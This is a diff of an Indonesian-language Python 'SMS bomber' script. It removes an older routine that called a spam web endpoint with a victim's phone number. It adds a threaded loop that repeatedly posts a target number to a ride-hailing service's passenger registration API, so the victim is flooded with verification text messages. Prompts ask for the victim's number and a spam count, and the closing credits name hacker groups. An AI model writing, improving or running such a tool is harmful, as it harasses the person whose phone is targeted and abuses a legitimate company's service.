@@ -23,30 +23,32 @@ def tik():
 
 
 def rog():
-    try:
-        os.system('clear')
-        print logo
-        print '\033[35;1m==[\033[31;1m Note :\033[37;1m Jangan Menggunakan Titik Atau Koma\n           \033[37;1mUntuk Memasukan Jumlah Spam\n\033[35;1m==[\033[31;1m Ex   :\033[37;1m 50000'
-        print "\033[31;1m+==========================================+"
-        nomor = raw_input('\033[32;1m[✓]\033[37;1m Masukan Nomor Hp Korban\033[35;1m =>\033[32;1m ')
-        jumlah = raw_input('\033[32;1m[✓]\033[37;1m Masukan Jumlah Spam \033[35;1m =>\033[32;1m ')
-        tik()
-        urllib2.urlopen('https://webmegk.000webhostapp.com/sms.php?nomor=' + nomor + '&jumlah=' + jumlh)
-        cek = open('bukti.txt','w')
-        cek.write('Spam Sudah Dikirim Ke Target Follow Instagram wisnu_as123\n\n')
-        cek.write('Nomor Hp Korban : '+nomor)
-        cek.write('\nJumlah Spam : '+jumlh)
-        cek.write('\n\nTerima Kasih Sudah Memakai Tools Saya Follow Instagram wisnu_as123')
-        cek.write('\n\n===[ THX : Wisnu Saputra && CyberTCA ]===')
-        cek.close()
-        os.system('mv -f bukti.txt /storage/emulated/0')
-        print "\n\033[31;1m+==========================================+"
-        print '\033[32;1m[✓]\033[37;1m Spam Berhasil Di Kirim'
-        print '\033[32;1m[✓]\033[37;1m Bukti Pengiriman\033[31;1m :\033[36;1m /storage/emulated/0/bukti.txt\n\n'
-    except:
-    	print "\n\033[31;1m+==========================================+"
-        print '\033[31;1m[×]\033[37;1m Server Operator Sedang Bermasalah\n    Cobalah Untuk Sesaat Lagi\n\n'
-        sys.exit()
+try:
 
-rog()
+	no = input("\033[1;32m[+] Nomer Target [62xxx] :\033[1;37m ")
+	jum=int(input("\033[1;35m[+] Jumlah : \033[1;37m"))
+except KeyboardInterrupt:
+	print("\nKey interrupt")
+	exit()
+print()
+print("\033[1;37m[?] HASIL! [?]")
+def main(arg):
+	try:
+		idk=('phoneNumber')
+		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+#		print(r.text)
+		if str(idk) in str(r.text):
+			print("\033[1;32m[+] SUKSES [+]")
+		else:
+			print("\033[1;31m[-] GAGAL [-]")
+	except: pass
 
+jobs = []
+for x in range(jum):
+    jobs.append(x)
+p=ThreadPool(5)
+p.map(main,jobs)
+print ("\033[1;33m")
+print ("\033[1;36m[+] TERIMA KASIH TELAH MENGGUNAKAN SCRIPT INI [+]")
+print ("\033[1;35m[!] THANKS TO |  BERMUDA-CYBER-TEAM | HACKER INDONESIA [!]")
+print ("\033[1;31m")
